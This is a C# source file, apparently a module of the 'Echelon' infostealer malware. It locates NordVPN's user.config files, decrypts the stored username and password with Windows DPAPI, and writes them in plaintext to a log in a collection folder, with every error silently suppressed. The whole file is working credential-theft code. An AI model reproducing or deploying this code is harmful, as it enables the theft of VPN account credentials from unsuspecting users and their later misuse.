

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Echelon
{
    internal class NordVPN
    {
        public static int count;

        public static string NordVPNDir = "\\Vpn\\NordVPN";

        public static void GetNordVPN(string Echelon_Dir)
        {
            try
            {
                if (Directory.Exists(Help.LocalData + "\\NordVPN\\"))
                {
                    Directory.CreateDirectory(Echelon_Dir + NordVPNDir);
                    using (var streamWriter = new StreamWriter(Echelon_Dir + NordVPNDir + "\\Account.log"))
                    {
                        var directoryInfo = new DirectoryInfo(Path.Combine(Help.LocalData, "NordVPN"));
                        if (directoryInfo.Exists)
                        {

                            var directories = directoryInfo.GetDirectories("NordVpn.exe*");
                            for (var i = 0; i < directories.Length; i++)
                                foreach (var directoryInfo2 in directories[i].GetDirectories())
                                {

                                    streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
                                    var text = Path.Combine(directoryInfo2.FullName, "user.config");
                                    if (File.Exists(text))
                                    {



                                        var xmlDocument = new XmlDocument();
                                        xmlDocument.Load(text);
                                        var innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                                        var innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
                                        if (innerText != null && !string.IsNullOrEmpty(innerText)) streamWriter.WriteLine("\t\tUsername: " + Nord_Vpn_Decoder(innerText));
                                        if (innerText2 != null && !string.IsNullOrEmpty(innerText2)) streamWriter.WriteLine("\t\tPassword: " + Nord_Vpn_Decoder(innerText2));
                                        count++;
                                    }
                                }
                        }
                    }
                    

                }
            }
            catch { }

        }

        public static string Nord_Vpn_Decoder(string s)
        {
            string result;
            try
            {
                result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
            }
            catch
            {
                result = "";
            }
            return result;
        }
    }
}
